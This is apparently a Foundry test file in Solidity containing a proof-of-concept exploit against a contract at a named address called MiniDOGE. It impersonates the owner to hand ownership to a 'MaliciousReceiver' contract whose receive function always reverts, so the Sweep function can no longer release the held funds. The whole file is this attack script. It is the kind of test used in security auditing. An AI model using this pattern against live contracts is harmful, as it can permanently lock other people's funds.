pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function Sweep() external;
}

contract MaliciousReceiver {
    receive() external payable {
        revert("Funds are now trapped forever!");
    }
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // 1. Deploy the malicious contract that will become the new owner
                MaliciousReceiver maliciousReceiver = new MaliciousReceiver();
                vm.label(address(maliciousReceiver), "Malicious Receiver");

                // 2. Get an interface for the target contract
                IMiniDOGE miniDoge = IMiniDOGE(TARGET);

                // 3. Get the original owner and impersonate them to transfer ownership
                address originalOwner = miniDoge.owner();
                vm.prank(originalOwner);
                miniDoge.transferOwnership(address(maliciousReceiver));

                // Oracle Check: The owner is now the malicious contract, trapping funds.
                assertEq(miniDoge.owner(), address(maliciousReceiver));

                // 4. (Demonstration) Any attempt to sweep funds will now fail.
                // We still need to prank as the *new* owner (the malicious contract) to call Sweep
                vm.prank(address(maliciousReceiver));
                vm.expectRevert("Funds are now trapped forever!");
                miniDoge.Sweep();
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

